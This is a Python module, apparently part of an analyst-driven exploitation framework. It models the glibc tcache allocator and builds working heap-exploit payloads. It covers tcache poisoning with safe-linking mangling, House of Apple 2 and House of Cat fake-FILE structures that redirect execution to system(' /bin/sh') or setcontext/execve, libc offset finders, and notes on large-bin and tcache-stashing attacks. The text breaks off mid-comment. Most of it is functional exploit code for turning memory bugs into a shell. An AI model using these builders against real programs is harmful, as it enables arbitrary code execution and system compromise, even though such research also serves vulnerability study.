"""Heap-layout primitives (Phase 9 frontier, MAZE/AAHEG-style, analyst-in-the-loop).

A deterministic model of the glibc **tcache** allocator (per-size-class LIFO bins with
safe-linking), plus the two primitives an analyst drives against a real target:

  * **grooming / reclaim** — LIFO reuse means allocating a freed size-class returns the most
    recently freed chunk; allocate the same size to place a controlled chunk at a chosen
    freed address, or allocate consecutively to make chunks adjacent (MAZE layout goals).
  * **tcache poisoning** — after a use-after-free (or overflow into a freed chunk's fd), set
    the chunk's forward pointer to a target; the second following malloc then returns that
    target -> an **arbitrary-address allocation** (arbitrary write). Safe-linking (glibc
    >=2.32) mangles the stored fd, and this computes the exact value to write.

Pure stdlib and deterministic. This models the allocator and emits the recipe; wiring it to a
specific target's alloc/free interface is the analyst-in-the-loop step (doc 15).
"""
from __future__ import annotations

from dataclasses import dataclass, field

# x86-64 glibc constants
_ALIGN = 0x10
_MINSIZE = 0x20
SIZE_SZ = 8
TCACHE_MAX_BINS = 64
#: The DEFAULT chunks-per-bin a tcache holds, for the simulator and for callers that have no
#: compiler to measure with. It is not a constant of nature and the textbook 7 is already wrong
#: on current glibc: measured on this host, chunk 0x90 spills out of the tcache on the SEVENTEENTH
#: free, so the capacity is 16. Any recipe that fills exactly 7 and expects the next free to reach
#: a bin silently gets nothing -- which is why the live routes fill until they OBSERVE a spill
#: rather than counting to a number. Use `tcache_capacity()` when a count has to be right.
TCACHE_COUNT = 7                       # chunks per size-class bin (glibc's historical default)
MAX_FAST = 0x80                        # default global_max_fast (chunk size); <= -> fastbin
MIN_LARGE = 0x400                      # chunk size at/above this is a large bin (else small)


def is_fastbin(chunk_size: int) -> bool:
    return _MINSIZE <= chunk_size <= MAX_FAST


def is_smallbin(chunk_size: int) -> bool:
    return _MINSIZE <= chunk_size < MIN_LARGE


def request2size(req: int) -> int:
    """glibc chunk size for a malloc(req) request (x86-64)."""
    size = (req + SIZE_SZ + _ALIGN - 1) & ~(_ALIGN - 1)
    return max(size, _MINSIZE)


def tcache_index(chunk_size: int) -> int:
    """tcache bin index for a chunk size (0 -> 0x20 ... 63 -> 0x410)."""
    return (chunk_size - _MINSIZE) // _ALIGN


def in_tcache_range(chunk_size: int) -> bool:
    return 0 <= tcache_index(chunk_size) < TCACHE_MAX_BINS


def mangle(fd_slot_addr: int, ptr: int) -> int:
    """Safe-linking PROTECT_PTR: the value stored in a freed chunk's fd (glibc >=2.32).
    `fd_slot_addr` is the address of the fd field (== the chunk's user pointer for tcache)."""
    return ((fd_slot_addr >> 12) ^ ptr) & 0xFFFFFFFFFFFFFFFF


def demangle(fd_slot_addr: int, stored: int) -> int:
    """Inverse of mangle (recover the real fd from a stored, safe-linked value)."""
    return ((fd_slot_addr >> 12) ^ stored) & 0xFFFFFFFFFFFFFFFF


@dataclass
class TcacheModel:
    """A minimal glibc tcache simulator that predicts reuse ORDER and poisoning outcomes.
    Chunk addresses are symbolic (assigned from a bump base) -- the model reasons about which
    chunk a malloc returns, not glibc's exact absolute layout."""
    base: int = 0x1000
    bins: dict = field(default_factory=dict)          # tcache_index -> [user_ptr] (LIFO tail=head)
    counts: dict = field(default_factory=dict)
    fastbins: dict = field(default_factory=dict)      # chunk_size -> [user_ptr] (LIFO tail=head)
    otherbins: dict = field(default_factory=dict)     # chunk_size -> [user_ptr] (small/large FIFO)
    live: dict = field(default_factory=dict)          # user_ptr -> chunk_size
    poison: dict = field(default_factory=dict)        # user_ptr -> forged next ptr (UAF fd write)
    _top: int = 0

    def __post_init__(self):
        self._top = self.base

    def malloc(self, req: int) -> int:
        cs = request2size(req)
        i = tcache_index(cs)
        bin_ = self.bins.get(i)
        if in_tcache_range(cs) and bin_:
            ptr = bin_.pop()                           # tcache LIFO (checked first)
            self.counts[i] = self.counts.get(i, 0) - 1
            # a poisoned fd redirects the bin head to the forged target
            if ptr in self.poison:
                self.bins.setdefault(i, []).append(self.poison.pop(ptr))
                self.counts[i] = self.counts.get(i, 0) + 1
            self.live[ptr] = cs
            return ptr
        if is_fastbin(cs) and self.fastbins.get(cs):
            ptr = self.fastbins[cs].pop()              # fastbin LIFO (after tcache drains)
            self.live[ptr] = cs
            return ptr
        if self.otherbins.get(cs):
            ptr = self.otherbins[cs].pop(0)            # small/large bins are FIFO
            self.live[ptr] = cs
            return ptr
        ptr = self._top + SIZE_SZ * 2                  # user data after the chunk header
        self._top += cs
        self.live[ptr] = cs
        return ptr

    def free(self, ptr: int) -> None:
        cs = self.live.pop(ptr, None)
        if cs is None:
            return
        i = tcache_index(cs)
        # glibc order: tcache (until full) -> fastbin (small) -> unsorted->small/large (FIFO)
        if in_tcache_range(cs) and self.counts.get(i, 0) < TCACHE_COUNT:
            self.bins.setdefault(i, []).append(ptr)
            self.counts[i] = self.counts.get(i, 0) + 1
        elif is_fastbin(cs):
            self.fastbins.setdefault(cs, []).append(ptr)
        else:
            self.otherbins.setdefault(cs, []).append(ptr)

    def write_fd(self, freed_ptr: int, target: int) -> None:
        """Model a UAF/overflow write of a freed chunk's forward pointer to `target`."""
        self.poison[freed_ptr] = target


def tcache_poison_recipe(req: int, *, names=("A", "B")) -> dict:
    """The op sequence + fd-mangling to turn a UAF on a `req`-byte chunk into an
    arbitrary-address allocation. `mangle` must be applied with the *runtime* chunk address
    (leaked at exploit time) because safe-linking depends on it."""
    a, b = names
    cs = request2size(req)
    if not in_tcache_range(cs):
        return {"ok": False, "reason": f"size {req} (chunk {hex(cs)}) is outside tcache range"}
    return {
        "ok": True, "chunk_size": cs, "tcache_index": tcache_index(cs),
        "ops": [
            ("alloc", a, req), ("alloc", b, req),
            ("free", b), ("free", a),                  # tcache head is now A (LIFO)
            ("write_fd", a, "mangle(addr(A), TARGET)"),
            ("alloc", "_", req),                        # returns A
            ("alloc", "OUT", req),                      # returns TARGET
        ],
        "mangle": mangle,                               # mangle(addr_of_A, target)
        "notes": ("safe-linking (glibc>=2.32): write mangle(addr(A), TARGET) into A's fd; "
                  "TARGET must be 16-byte aligned; glibc's tcache double-free key check is "
                  "bypassed by the UAF write rather than free(A);free(A)."),
        "result": "the second malloc after the write returns TARGET (arbitrary allocation).",
    }


def groom_reclaim(req: int) -> dict:
    """Place a controlled chunk at a just-freed address (LIFO reclaim)."""
    return {"ops": [("free", "VICTIM"), ("alloc", "CONTROLLED", req)],
            "result": "CONTROLLED is allocated at VICTIM's address (same size-class, LIFO)."}


# --- House of Apple 2: arbitrary write + libc leak -> shell on modern glibc (>= 2.34) -----------
import struct as _struct  # noqa: E402

# Fixed _IO_FILE / _IO_wide_data field offsets (stable across glibc; verified live on 2.35-2.43).
_F_FLAGS, _F_WRITE_BASE, _F_WRITE_PTR = 0x00, 0x20, 0x28
_F_BUF_BASE, _F_LOCK, _F_WIDE_DATA, _F_VTABLE = 0x38, 0x88, 0xA0, 0xD8
_WD_BUF_BASE, _WD_VTABLE = 0x30, 0xE0                 # inside the _IO_wide_data
_JT_DOALLOCATE = 0x68                                 # __doallocate slot in an _IO_jump_t


def build_house_of_apple2(write_addr: int, *, wfile_jumps: int, system: int,
                          command: bytes = b" /bin/sh") -> bytes:
    """A fake _IO_FILE (House of Apple 2) that turns an ARBITRARY WRITE over `_IO_2_1_stdout_` plus
    a libc leak into a call to system(command) -- the modern-glibc replacement for the removed
    __free_hook. When a FILE is flushed (exit(), fflush, or the next buffered write), glibc walks
    _IO_list_all and calls `_IO_OVERFLOW(fp)`; with the vtable pointed at `_IO_wfile_jumps` that is
    `_IO_wfile_overflow` -> `_IO_wdoallocbuf` -> `fp->_wide_data->_wide_vtable->__doallocate(fp)`,
    a controlled call with rdi == fp. Point __doallocate at `system` and the call is system(fp);
    since fp is this struct, its first bytes ARE the command (a leading space keeps the flag bits
    the overflow path checks -- NO_WRITES/UNBUFFERED/CURRENTLY_PUTTING -- clear).

    Returns the bytes to write at `write_addr` (== the runtime address of `_IO_2_1_stdout_`); the
    fake `_IO_wide_data` and wide vtable are laid out self-contained within the same blob."""
    assert command[:1] in (b" ", b"\t") and not (command[0] & 0x80A), \
        "command's first byte must keep _flags' NO_WRITES/UNBUFFERED/CURRENTLY_PUTTING bits clear"
    wide_data = write_addr + 0xE0
    wide_vt = write_addr + 0x200
    lock = write_addr + 0x2A0                          # a zeroed, writable 8 bytes (in this blob)
    blob = bytearray(b"\x00" * 0x300)

    def w(off, val):
        blob[off:off + 8] = _struct.pack("<Q", val & 0xFFFFFFFFFFFFFFFF)

    blob[0:len(command)] = command                     # _flags == the command string
    w(_F_WRITE_BASE, 0)
    w(_F_WRITE_PTR, 1)                                 # write_ptr > write_base -> flush calls overflow
    w(_F_BUF_BASE, 0)
    w(_F_LOCK, lock)
    w(_F_WIDE_DATA, wide_data)
    w(_F_VTABLE, wfile_jumps)
    w(0xE0 + _WD_BUF_BASE, 0)                          # wide _IO_buf_base == 0 -> take the allocate path
    w(0xE0 + _WD_VTABLE, wide_vt)
    w(0x200 + _JT_DOALLOCATE, system)                 # the controlled call target
    return bytes(blob)


def build_house_of_apple2_split(stdout_addr: int, wide_addr: int, *, wfile_jumps: int, system: int,
                                command: bytes = b" /bin/sh"):
    """House of Apple 2 as TWO small writes instead of one 0x300 blob, for a notebook whose size cap
    cannot hold the full fake FILE. Returns (file_hdr, wide_blob):

      file_hdr  (0xE0 B) -- written AT `_IO_2_1_stdout_`; the whole _IO_FILE_plus, with _wide_data
                            and _lock pointing into a chunk the caller owns at `wide_addr`.
      wide_blob (0xE8 B) -- written at `wide_addr`: the fake _IO_wide_data at +0 with its jump table
                            packed at +0x18, so the three fields that matter land clear of each
                            other -- 0x30 (_IO_buf_base == 0, to take the allocate path), 0x80 (the
                            table's __doallocate == system) and 0xE0 (_wide_vtable). 0xA0 is left
                            zero for _lock to point at.

    build_house_of_apple2 needs 0x2A8 bytes only because those two structures sit inside the stdout
    write; hoisting them into the caller's own chunk drops the largest single write to 0xE8, which a
    small-cap notebook can still allocate."""
    assert command[:1] in (b" ", b"\t") and not (command[0] & 0x80A), \
        "command's first byte must keep _flags' NO_WRITES/UNBUFFERED/CURRENTLY_PUTTING bits clear"
    wide_vt = wide_addr + 0x18
    wide = bytearray(b"\x00" * 0xE8)
    hdr = bytearray(b"\x00" * 0xE0)

    def _w(buf, off, val):
        buf[off:off + 8] = _struct.pack("<Q", val & 0xFFFFFFFFFFFFFFFF)

    _w(wide, _WD_BUF_BASE, 0)                          # take the allocate path
    _w(wide, 0x18 + _JT_DOALLOCATE, system)            # the controlled call target
    _w(wide, _WD_VTABLE, wide_vt)
    hdr[0:len(command)] = command                      # _flags == the command string
    _w(hdr, _F_WRITE_BASE, 0)
    _w(hdr, _F_WRITE_PTR, 1)                           # write_ptr > write_base -> flush calls overflow
    _w(hdr, _F_BUF_BASE, 0)
    _w(hdr, _F_LOCK, wide_addr + 0xA0)                 # zeroed, writable, inside our own chunk
    _w(hdr, _F_WIDE_DATA, wide_addr)
    _w(hdr, _F_VTABLE, wfile_jumps)
    return bytes(hdr), bytes(wide)


# The largest single write build_house_of_apple2 needs (its _lock sits at +0x2A0). Below this a
# notebook's size cap cannot hold the one-piece FILE, and build_house_of_apple2_split applies.
HOA2_BLOB_MIN = 0x2A8
HOA2_SPLIT_MIN = 0xE8                                  # the larger of the split path's two writes


#: House of Apple 2 as a handful of 8-byte CELLS, for a primitive that writes one word at a
#: chosen address (CWE-129 `arr[i] = v`, a %n format write, a tcache chunk placed over a pointer)
#: rather than a run of bytes. The one-piece blob cannot be delivered that way at all: the 0x300
#: bytes land over `_IO_2_1_stdout_` AND the `stdout`/`stderr`/`stdin` pointer variables that
#: follow it, and a cell-at-a-time writer runs the target's own code -- its next prompt -- between
#: every write, so a half-built FILE is executed. Five cells, and the FILE is one the program
#: never touches, so nothing in between runs through it. How many cells depends on the plan:
#: five for `house_of_apple2_cells` (`system`), nine for `setcontext_fsop_cells`.


def house_of_apple2_cells(fp_addr: int, *, wide_data: int, wide_vtable: int, wfile_jumps: int,
                          system: int, command: bytes = b" /bin/sh") -> list:
    """House of Apple 2 delivered as [(address, 8-byte value)] -- five arbitrary writes -- instead
    of `build_house_of_apple2`'s one 0x300 blob. For an ARBITRARY-WRITE primitive that places one
    word at a time (an unchecked array index, a %n write) this is the only deliverable form.

    `fp_addr` is the FILE to forge. It must be one the program does not use between the writes:
    `_IO_2_1_stderr_` is the pick for a program that writes only to stdout, because a forged FILE
    is read by nothing until `exit()` walks `_IO_list_all`. `wide_data` is that FILE's REAL
    `_wide_data` (read out of the target, not guessed; its `_IO_buf_base` is already NULL for a
    stream that never saw a wide character, which is the condition `_IO_wdoallocbuf` tests).
    `wide_vtable` is any writable 8 bytes whose +0x68 we may set -- the target's own global array
    does nicely, which keeps the forgery inside memory the bug already reaches.

    The order is load-bearing, so the caller writes them in sequence:

      1. `wide_vtable + 0x68 := system`  -- the fake `__doallocate`, outside the FILE.
      2. `wide_data + 0xE0 := wide_vtable` -- the fake `_wide_vtable`, still outside the FILE.
      3. `fp + 0x28 := 1` -- `_IO_write_ptr > _IO_write_base`, the test `_IO_flush_all` applies.
      4. `fp + 0xD8 := _IO_wfile_jumps` -- `_IO_OVERFLOW` becomes `_IO_wfile_overflow`.
      5. `fp + 0x00 := command` -- `_flags` doubles as the string, and rdi == fp at the call.

    `_flags` is last because the command's first byte (a space, 0x20) sets `_IO_ERR_SEEN`: writing
    it any earlier stops that FILE being usable, which matters when the only forgeable FILE is one
    the program still reads from. `exit()` then flushes the forged FILE: `_IO_wfile_overflow` sees
    a NULL wide `_IO_buf_base`, calls `_IO_wdoallocbuf` -> `_wide_data->_wide_vtable->__doallocate(fp)`
    == `system(fp)`, and fp's first bytes are the command."""
    assert command[:1] in (b" ", b"\t") and not (command[0] & 0x80A), \
        "command's first byte must keep _flags' NO_WRITES/UNBUFFERED/CURRENTLY_PUTTING bits clear"
    cmd = _struct.unpack("<Q", (command + b"\x00" * 8)[:8])[0]
    return [(wide_vtable + _JT_DOALLOCATE, system),
            (wide_data + _WD_VTABLE, wide_vtable),
            (fp_addr + _F_WRITE_PTR, 1),
            (fp_addr + _F_VTABLE, wfile_jumps),
            (fp_addr + _F_FLAGS, cmd)]


#: The two `_flags` bits the setcontext route turns, and why each one has to turn.
#:
#: `_IO_UNBUFFERED` (0x2): `_IO_wdoallocbuf` opens `test BYTE PTR [rdi],0x2` and an unbuffered
#: stream takes a path that NEVER reaches `call [rax+0x68]`. The `system` route gets away with
#: leaving the bit alone only by accident -- it overwrites `_flags` with `" /bin/sh"`, whose
#: leading space (0x20) happens to clear it. A route that needs `_flags` for anything else has to
#: clear the bit deliberately, and stderr ships with it set.
#:
#: `_IO_USER_LOCK` (0x8000): `_IO_flockfile` is
#: `if ((fp->_flags & _IO_USER_LOCK) == 0) _IO_lock_lock (*fp->_lock)`, so setting it stops
#: `_IO_flush_all` dereferencing `_lock` at all. That is what frees fp+0x88 -- which is `_lock`
#: AND `gregs[RDX]` -- to be 0, and a NULL rdx is what lets RIP go straight to `execve` with no
#: chain and no gadget.
_F_UNBUFFERED, _F_USER_LOCK = 0x2, 0x8000


def setcontext_fsop_cells(fp_addr: int, *, flags: int, wide_data: int, wide_vtable: int,
                          wfile_jumps: int, setcontext: int, fields: dict, rip_at: int,
                          rip: int, rdi: int = 0, rsi: int = 0, rdx: int = 0) -> list:
    """House of Apple 2 with `setcontext` as the fake `__doallocate` instead of `system` -- the
    same arbitrary-write cells, but the effect is a full REGISTER LOAD rather than one call with
    one argument. Returns [(address, 8-byte value)] in write order, like
    `house_of_apple2_cells`.

    It works because of one instruction in the caller. `_IO_wdoallocbuf` does `mov rdx,rdi` before
    `call [rax+0x68]`, so at the controlled call RDX holds the FILE POINTER -- and `setcontext`
    reads its context through rdx. The forged FILE *is* the ucontext. `rop.find_setcontext` gives
    `fields` (register -> offset) and `rip_at`; the offsets land on FILE fields that are dead by
    then or that we are setting anyway:

      gregs[RDI] 0x68 = `_chain`        -- only `_IO_flush_all`'s next step reads it, and we leave
      gregs[RSI] 0x70 = `_fileno`       -- unused between the lock and the overflow
      gregs[RDX] 0x88 = `_lock`         -- free ONLY because `_IO_USER_LOCK` is set (see above)
      gregs[RSP] 0xA0 = `_wide_data`    -- the pivoted stack IS the forged wide_data, which the
                                           write primitive reaches by construction
      gregs[RIP] 0xA8 = `_freeres_list` -- unused

    `rsp` is not a free parameter for that reason: it is `wide_data`, so a chain the caller wants
    executed goes at `wide_data + 0`, with `wide_data + 0x30` left NULL (the wide `_IO_buf_base`
    the allocate path tests) -- six words before it collides. The caller does not need one at all
    for `execve("/bin/sh", NULL, NULL)`: rdi/rsi/rdx and rip cover it, which is the thing `system`
    could not do.

    Order: the two writes outside the FILE first, then the FILE's own fields, `_flags` and the
    vtable last -- the vtable write is what arms the forgery."""
    if rip_at is None:
        raise ValueError("setcontext_fsop_cells needs rip_at (the pushed-RIP offset); this libc's "
                         "setcontext does not expose one, so the caller must use the system route")
    cells = [(wide_vtable + _JT_DOALLOCATE, setcontext),
             (wide_data + _WD_VTABLE, wide_vtable),
             (fp_addr + _F_WRITE_PTR, 1)]
    for reg, val in (("rdi", rdi), ("rsi", rsi), ("rdx", rdx)):
        if reg in fields:
            cells.append((fp_addr + fields[reg], val))
    cells.append((fp_addr + rip_at, rip))
    cells.append((fp_addr + _F_FLAGS, (flags & ~_F_UNBUFFERED) | _F_USER_LOCK))
    cells.append((fp_addr + _F_VTABLE, wfile_jumps))
    return cells


#: Where the fake `_IO_wide_data` and `_wide_vtable` sit inside a House-of-Cat blob. They are
#: inside the FILE's own buffer so that ONE contiguous write delivers all three structures, and
#: far enough apart that neither overlaps a FILE field: the FILE proper ends at its vtable
#: pointer (0xD8) and an `_IO_wide_data` is 0xE8 long.
_CAT_WIDE_OFF, _CAT_VT_OFF, _CAT_LOCK_OFF = 0x180, 0x300, 0x380
CAT_BLOB_MIN = 0x390                                   # the whole blob, lock included


def build_house_of_cat(file_addr: int, *, wfile_jumps: int, plan: str = "system",
                       system: int = 0, command: bytes = b" /bin/sh", setcontext: int = 0,
                       fields: dict | None = None, rip_at: int = 0xA8, rip: int = 0,
                       rdi: int = 0, rsi: int = 0, rdx: int = 0, size: int = CAT_BLOB_MIN) -> bytes:
    """A FULLY CONTROLLED fake FILE, for the route that corrupts `_IO_list_all` instead of a FILE
    glibc already owns. Returns the blob to place at `file_addr`; the caller's own primitive then
    only has to write ONE pointer, `_IO_list_all := file_addr`.

    This is the answer when `_IO_2_1_stderr_` is unusable -- a program that writes to stderr, or
    one whose `_wide_data` cannot be read back, or a libc whose FILEs sit in a page the write
    primitive cannot reach. Everything the flush path reads is inside the blob, so nothing has to
    be leaked out of the target except the libc base and `file_addr` itself.

    The gating condition is taken through `_mode`, which matters and is the difference from
    `house_of_apple2_cells`. `_IO_flush_all` fires on

        (fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
        || (fp->_mode > 0 && fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)

    and a blob delivered at a heap CHUNK address cannot choose the narrow `_IO_write_base` /
    `_IO_write_ptr` at 0x20/0x28 -- in a chunk sitting in a large bin those are `fd_nextsize` and
    `bk_nextsize`, pointers glibc wrote. So `_mode` is set to 1 and the wide pair, which is inside
    the blob, carries the test instead.

    `plan` picks the finish, the same two as the cell routes:
      "system"     -- `_flags` doubles as the command, because `__doallocate(fp)` is called with
                      rdi == fp. Its leading space also clears `_IO_UNBUFFERED` for free.
      "setcontext" -- `_flags` is `_IO_USER_LOCK` and the gregs fields carry the registers; see
                      `setcontext_fsop_cells` for why those two bits are the load-bearing ones.

    `_lock` points inside the blob at zeroed bytes for the "system" plan, so `_IO_flush_all`'s
    lock acquire has somewhere real to write; the "setcontext" plan sets `_IO_USER_LOCK` instead
    and leaves fp+0x88 free to be gregs[RDX]."""
    assert size >= CAT_BLOB_MIN, f"a House-of-Cat blob needs {CAT_BLOB_MIN:#x} bytes, not {size:#x}"
    b = bytearray(size)

    def w(off, v):
        b[off:off + 8] = _struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)

    wide = file_addr + _CAT_WIDE_OFF
    vt = file_addr + _CAT_VT_OFF
    if plan == "setcontext":
        assert setcontext and rip, "the setcontext plan needs setcontext= and rip="
        f = fields or {"rdi": 0x68, "rsi": 0x70, "rdx": 0x88}
        w(_F_FLAGS, _F_USER_LOCK)                      # skip the lock; fp+0x88 becomes gregs[RDX]
        w(f["rdi"], rdi)
        w(f["rsi"], rsi)
        w(f["rdx"], rdx)
        w(rip_at, rip)
        w(_CAT_VT_OFF + _JT_DOALLOCATE, setcontext)
    else:
        assert system, "the system plan needs system="
        assert command[:1] in (b" ", b"\t"), \
            "command's first byte must keep _flags' UNBUFFERED/NO_WRITES bits clear"
        b[_F_FLAGS:_F_FLAGS + 8] = (command + b"\x00" * 8)[:8]    # _flags IS the command
        w(_F_LOCK, file_addr + _CAT_LOCK_OFF)          # zeroed bytes inside the blob
        w(_CAT_VT_OFF + _JT_DOALLOCATE, system)
        w(0x68, 0)                                     # _chain: stop the walk after us
    w(_F_WIDE_DATA, wide)                              # and, on the setcontext plan, gregs[RSP]
    w(0xC0, 1)                                         # _mode > 0 -> the WIDE pair gates the flush
    w(_F_VTABLE, wfile_jumps)                          # _IO_OVERFLOW == _IO_wfile_overflow
    w(_CAT_WIDE_OFF + 0x18, 0)                         # wide _IO_write_base
    w(_CAT_WIDE_OFF + 0x20, 1)                         # wide _IO_write_ptr > write_base
    w(_CAT_WIDE_OFF + _WD_BUF_BASE, 0)                 # wide _IO_buf_base == NULL -> allocate path
    w(_CAT_WIDE_OFF + _WD_VTABLE, vt)                  # wide _wide_vtable -> our fake jump table
    return bytes(b)


def cat_offsets() -> dict:
    """Where the three structures sit inside a House-of-Cat blob, for a reproducer that has to
    rebuild it without importing this module."""
    return {"wide": _CAT_WIDE_OFF, "vt": _CAT_VT_OFF, "lock": _CAT_LOCK_OFF}


def house_of_cat_targets(libc_data: bytes, plan: str = "system") -> dict:
    """The libc offsets a House-of-Cat blob needs, including `_IO_list_all` -- the one pointer the
    caller's primitive has to write."""
    from . import rop
    want = ["_IO_list_all", "_IO_wfile_jumps"] + (["execve"] if plan == "setcontext" else ["system"])
    syms = rop.libc_symbols(libc_data, tuple(want))
    if not all(k in syms for k in want):
        return {}
    out = {"list_all": syms["_IO_list_all"], "wfile_jumps": syms["_IO_wfile_jumps"],
           "blob_min": CAT_BLOB_MIN, "plan": plan}
    if plan == "setcontext":
        sc = rop.find_setcontext(libc_data)
        binsh = rop.find_string(libc_data, b"/bin/sh")
        # `rip_at` is where setcontext pushes the continuation; without it the register-load route
        # cannot place `execve`. Some libcs (e.g. glibc 2.43, whose setcontext tail no longer ends
        # in the `mov rcx,[rdx+..]; push rcx` this reads) do not expose it -- the setcontext finish
        # is then unavailable, and the caller picks `system` for the cat blob instead of crashing.
        if not (sc and binsh and sc.get("rip_at") is not None):
            return {}
        out.update({"setcontext": sc["entry"], "fields": sc["fields"], "rip_at": sc["rip_at"],
                    "execve": syms["execve"], "binsh": binsh})
    else:
        out["system"] = syms["system"]
    return out


def setcontext_fsop_targets(libc_data: bytes) -> dict:
    """What `setcontext_fsop_cells` needs out of the libc the target links: the FILE to forge, the
    wide jump table, `setcontext`'s register-loading entry and the `execve`/"/bin/sh" pair that
    makes a chainless shell. Empty if any of it is missing, so the caller can say which."""
    from . import rop
    want = ("_IO_2_1_stderr_", "_IO_wfile_jumps", "execve")
    syms = rop.libc_symbols(libc_data, want)
    sc = rop.find_setcontext(libc_data)
    binsh = rop.find_string(libc_data, b"/bin/sh")
    if not (sc and binsh and all(k in syms for k in want)):
        return {}
    return {"fp": syms["_IO_2_1_stderr_"], "wfile_jumps": syms["_IO_wfile_jumps"],
            "setcontext": sc["entry"], "fields": sc["fields"], "rip_at": sc["rip_at"],
            "execve": syms["execve"], "binsh": binsh, "fp_name": "_IO_2_1_stderr_",
            "wide_data_field": _F_WIDE_DATA, "wide_buf_base_field": _WD_BUF_BASE,
            "flags_field": _F_FLAGS}


def house_of_apple2_cell_targets(libc_data: bytes) -> dict:
    """The libc offsets `house_of_apple2_cells` needs. `_IO_2_1_stderr_` rather than stdout: the
    cells are written one at a time with the target's own code running in between, so the forged
    FILE has to be one that code does not use."""
    from . import rop
    want = ("_IO_2_1_stderr_", "_IO_wfile_jumps", "system")
    s = rop.libc_symbols(libc_data, want)
    if not all(k in s for k in want):
        return {}
    return {"fp": s["_IO_2_1_stderr_"], "wfile_jumps": s["_IO_wfile_jumps"],
            "system": s["system"], "fp_name": "_IO_2_1_stderr_",
            "wide_data_field": _F_WIDE_DATA, "wide_buf_base_field": _WD_BUF_BASE}


def house_of_apple2_targets(libc_data: bytes) -> dict:
    """The libc offsets House of Apple 2 needs: the FILE to corrupt (`_IO_2_1_stdout_`), the vtable
    (`_IO_wfile_jumps`) and `system`. Relocate each by the leaked libc base. {} if any is absent."""
    from . import rop
    s = rop.libc_symbols(libc_data, ("_IO_2_1_stdout_", "_IO_wfile_jumps", "system"))
    if not all(k in s for k in ("_IO_2_1_stdout_", "_IO_wfile_jumps", "system")):
        return {}
    return {"stdout": s["_IO_2_1_stdout_"], "wfile_jumps": s["_IO_wfile_jumps"],
            "system": s["system"]}


# --- large-bin attack: the write, and the check that decides whether it is arbitrary ------------
#
# glibc's unsorted-bin scan inserts a chunk into a large bin in sorted order, and the insertion
# ends in `victim->bk_nextsize->fd_nextsize = victim`. Corrupt the resident chunk's `bk_nextsize`
# to TARGET-0x20 and that line writes the NEW chunk's address to TARGET: one 8-byte heap pointer
# at an address of our choosing, needing no allocation of libc memory and no tcache -- which is
# why it is the route for a target whose every size is above the tcache ceiling.
#
# Whether it is an ARBITRARY write depends on the glibc, and the deciding fact is in the bytes
# rather than in a version table. There are two insertion branches:
#
#   short branch -- victim smaller than the smallest chunk in the bin
#   walk branch  -- victim is bigger, so the code walks `fd_nextsize` to the insertion point
#
# and each may be preceded by `if (fwd->bk_nextsize->fd_nextsize != fwd) malloc_printerr(...)`.
# That compare reads `*(bk_nextsize + 0x20)` -- THE VERY SLOT THE WRITE THEN OVERWRITES -- so a
# guarded branch demands `*TARGET == &resident_chunk` before it will write. Measured on this host:
#
#   glibc 2.35: one guard site  -> the short branch writes unchecked == arbitrary write
#   glibc 2.43: two guard sites -> both branches guarded. The attack degenerates into a POINTER
#               SWAP: it can replace a stored pointer to one of our chunks with a pointer to
#               another, and it cannot plant a heap address at (say) `_IO_list_all`, which holds
#               a libc pointer. Confirmed both ways live: unseeded, the target dies with
#               "malloc(): largebin double linked list corrupted (nextsize)"; with `*TARGET`
#               pre-seeded to the resident chunk's address, the write lands.
_LB_NEXTSIZE_MSG = b"malloc(): largebin double linked list corrupted (nextsize)\x00"


def guard_sites(libc_data: bytes, message: bytes):
    """How many places in this libc jump to the `malloc_printerr` call that prints `message`.

    This is how every allocator-hardening question here gets answered: a check is PRESENT OR
    ABSENT in the code, and counting the jumps that reach its error string settles it without a
    version table and without depending on the compiler's register allocation. One site means one
    of a pair of similar code paths is checked; two means both.

    Returns None when the string is absent or its reference cannot be found."""
    from . import rop
    off = libc_data.find(message)
    if off < 0:
        return None
    segs = rop._loads(libc_data)
    str_va = rop._va_of(segs, off)
    if str_va is None:
        return None
    lea_va = None
    for seg_off, sz, va, flags in segs:
        if not (flags & 1):                            # executable segments only
            continue
        i, end = seg_off, seg_off + sz
        while True:
            i = libc_data.find(b"\x48\x8d\x3d", i, end)
            if i < 0:
                break
            disp = _struct.unpack_from("<i", libc_data, i + 3)[0]
            if va + (i - seg_off) + 7 + disp == str_va:
                lea_va = va + (i - seg_off)
                break
            i += 1
        if lea_va is not None:
            break
    if lea_va is None:
        return None
    sites = 0
    for seg_off, sz, va, flags in segs:
        if not (flags & 1):
            continue
        for i in range(seg_off, seg_off + sz - 6):
            b = libc_data[i]
            if b == 0x0F and 0x80 <= libc_data[i + 1] <= 0x8F:          # jcc rel32
                tgt = va + (i - seg_off) + 6 + _struct.unpack_from("<i", libc_data, i + 2)[0]
            elif 0x70 <= b <= 0x7F:                                      # jcc rel8
                tgt = va + (i - seg_off) + 2 + _struct.unpack_from("<b", libc_data, i + 1)[0]
            else:
                continue
            if tgt == lea_va:
                sites += 1
    return sites


# --- tcache stashing: the unlink glibc still does not check -------------------------------------
#
# `_int_malloc`'s smallbin path hands out `last(bin)` through a GUARDED unlink and then stashes
# the bin's remaining same-size chunks into the tcache through an UNGUARDED one:
#
#     bck = tc_victim->bk;  bin->bk = bck;  bck->fd = bin;  tcache_put (tc_victim, tc_idx);
#
# so corrupting the to-be-stashed chunk's `bk` to TARGET-0x10 writes `&smallbin[i]` to TARGET and
# then stashes the FAKE chunk at TARGET-0x10, and the next allocation of that size RETURNS TARGET.
# Nothing here is safe-linked -- smallbin fd/bk never were -- so unlike tcache poisoning it needs
# no heap leak to mangle a pointer with.
#
# Measured on this host, and all three findings change the recipe the write-ups give:
#
#   * "malloc(): smallbin double linked list corrupted" has ONE site on 2.35 and on 2.43, so the
#     stashing unlink is still unchecked.
#   * the tcache holds 16 chunks per bin on 2.43, not the textbook 7.
#   * `calloc` NO LONGER BYPASSES THE TCACHE on 2.43 -- it takes the tcache head like malloc. The
#     write-ups all use calloc to reach the smallbin path while the tcache still has room. What
#     still bypasses it here is `memalign` with an alignment above 0x10, and a GROWING `realloc`.
#
# The last one has a consequence worth stating, because it contradicts the usual description of
# this technique as "write a libc address AND get an allocation". Reaching the smallbin path with
# an ordinary malloc requires that tcache bin to be EMPTY, so the stash loop starts at count 0,
# always has room for the fake chunk, and stashes it on the next iteration -- and `tcache_put`
# writes the fake's `next` at fake+0x10, which is TARGET, the same slot the unlink just wrote
# `&bin` into. So with a plain malloc trigger the libc write is TRANSIENT and the deliverable is
